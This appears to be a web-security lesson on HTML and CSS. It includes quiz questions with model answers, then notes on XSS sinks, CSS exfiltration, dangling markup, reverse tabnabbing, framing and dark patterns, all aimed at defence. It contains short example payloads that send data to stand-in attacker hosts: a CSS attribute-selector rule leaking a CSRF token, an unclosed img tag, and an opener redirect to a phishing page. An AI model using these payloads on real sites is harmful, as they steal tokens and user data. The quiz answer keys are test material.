checks:
  - q: "List five XSS sinks in HTML/templating and the escaping or sanitisation each needs."
    a: "(1) `element.innerHTML = x` / `insertAdjacentHTML` / `outerHTML`: use `textContent`, or sanitise with an allowlist and enforce Trusted Types. (2) A template's raw filter (`{{{ x }}}`, `| safe`, `dangerouslySetInnerHTML`, `v-html`): remove it or sanitise first. (3) `href`/`src` attributes: allow only http(s)/mailto/relative schemes, then HTML-escape. (4) Values inside `<script>`: serialise as JSON with `<` escaped, or use a data attribute. (5) `srcdoc` and `document.write`: treat as full HTML documents: sanitise, and sandbox the iframe. Inline event handlers built from strings (`onclick=\"…${x}…\"`) need JavaScript-string encoding on top of HTML escaping: better, never build them."
  - q: "Explain how an attribute selector plus `background-image` can exfiltrate a CSRF token."
    a: "If an attacker can inject CSS on a page containing `<input type=\"hidden\" name=\"csrf\" value=\"k3v9…\">`, they write one rule per possible first character: `input[name=csrf][value^=\"a\"] { background-image: url(https://evil.example/?c=a) }`, and so on. Only the matching rule's image is requested, leaking the first character; the next round (another injection, or an @import chain that serves generated CSS) leaks the second. Hidden inputs don't render backgrounds, so real attacks target a following sibling (`input[value^=a] + *`) or use `:has()`. Defence: never allow user-controlled CSS, and a CSP `style-src` without `unsafe-inline` plus a restrictive `img-src`."
  - q: "Explain why uploaded SVGs should be served from a separate origin or sanitised."
    a: "SVG is a document format: it can contain `<script>`, event handlers (`onload`), `<foreignObject>` with HTML, and links. If a user-uploaded `.svg` is served from your origin with `Content-Type: image/svg+xml` and someone opens it directly (not via `<img>`), its scripts run with your origin's privileges: cookies, same-origin APIs, your users' sessions. Serve uploads from a separate cookieless domain (e.g. usercontent.example), with `Content-Security-Policy: sandbox` and `Content-Disposition: attachment` where appropriate, or sanitise/rasterise SVGs on upload."
  - q: "Explain reverse tabnabbing and why modern browsers changed the default."
    a: "A page opened with `target=\"_blank\"` used to get `window.opener`, a reference back to the page that opened it. A malicious (or compromised) destination could run `window.opener.location = 'https://phish.example/login'`, silently replacing your tab with a fake login while the user looks at the new tab. Browsers now treat `target=\"_blank\"` as `rel=\"noopener\"` by default, so `opener` is null; `rel=\"opener\"` opts back in when you really need it."

## XSS through markup

**Injection contexts**: element content, attribute values (quoted and unquoted), URLs, inline event handlers, `<script>` and `<style>` blocks. **Dangerous sinks**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `srcdoc`, `dangerouslySetInnerHTML`, `v-html`, and template "raw" filters. **URL schemes**: `javascript:` and `data:` in `href` and `src`. **SVG uploads**: scripts and event handlers inside SVG served as `image/svg+xml` from your origin. (The escaping-by-context lab in Part 22 shows each context.)

## Defences

**Context-aware auto-escaping** (Part 22) by default; **allowlist sanitising** for the rare HTML you must accept; **Trusted Types** (a CSP mode that makes DOM sinks refuse plain strings, so every assignment goes through a reviewed policy); the **Sanitizer API** (`setHTML()`) **[Frontier]**; and a **Content Security Policy**. For your CSS, a strict CSP means **nonces** for `<style>` tags and avoiding inline `style` attributes (or accepting `'unsafe-hashes'`). And **serve user uploads from a separate origin**.

## CSS injection and exfiltration

With **attribute selectors** and **`background-image: url()`**, injected CSS can leak attribute values (CSRF tokens, input values) one character at a time: only the rule that matches fetches its image. `@import` chains and **`@font-face` with `unicode-range`** are further side channels (which characters appear on the page). The rule: **never allow user-controlled CSS** without strict sanitisation, and restrict `style-src` and `img-src` with CSP.

## Dangling markup, `<base>` hijacking and form actions

**Dangling markup injection**: when you *can't* inject a script (strict CSP), an unclosed attribute still works: `<img src='https://evil.example/?` swallows everything up to the next matching quote (including a CSRF token or private text) into a URL the browser requests. **`<base href>` hijacking** re-points every relative URL; **form action hijacking** (an injected `<form action>` or `formaction`) sends user input elsewhere; `<meta http-equiv="refresh">` redirects. Defences: escape everything, CSP `base-uri 'none'` and `form-action 'self'`, and Chrome's block on newlines plus `<` in URLs.

## Links and framing

`target="_blank"` now implies **`noopener`** (add it explicitly for old browsers; it prevents reverse tabnabbing). `rel="noreferrer"` for privacy and `referrerpolicy`. **iframe `sandbox`** tokens and the **`allow-scripts` + `allow-same-origin` trap**, `allow` for permissions, `credentialless` iframes. **Clickjacking**: an invisible frame of your site over a decoy button; defend with CSP **`frame-ancestors`** (and watch for UI-redress attacks built from transparent overlays in your own pages).

## Forms and credentials

Help password managers: correct **`autocomplete`** (never disable it), `type="password"` with a **show-password toggle**, **passkey autofill** with `autocomplete="username webauthn"`. Never put secrets in hidden fields or URLs (they end up in logs, history and Referer headers). HTTPS forms only.

## Privacy in markup and styles

**`:visited` restrictions** stop history sniffing (only colours apply, and `getComputedStyle` lies). Third-party **fonts, images and embeds** leak visits: self-host and use **facades**. Tracking pixels. **`loading="lazy"`** is a privacy win for below-the-fold embeds. **Fingerprinting surfaces** (installed fonts, media queries). And **consent gating in markup**: don't load the script tag until consent.

## Trust signals and anti-phishing

Never mimic browser chrome or system dialogs; make link destinations clear. And know the **dark-pattern** line: disguised ads, **confirmshaming**, **pre-ticked boxes**, roach motels (easy in, hard out), hidden costs. Legal frameworks increasingly regulate them (the EU DSA, US FTC guidance).
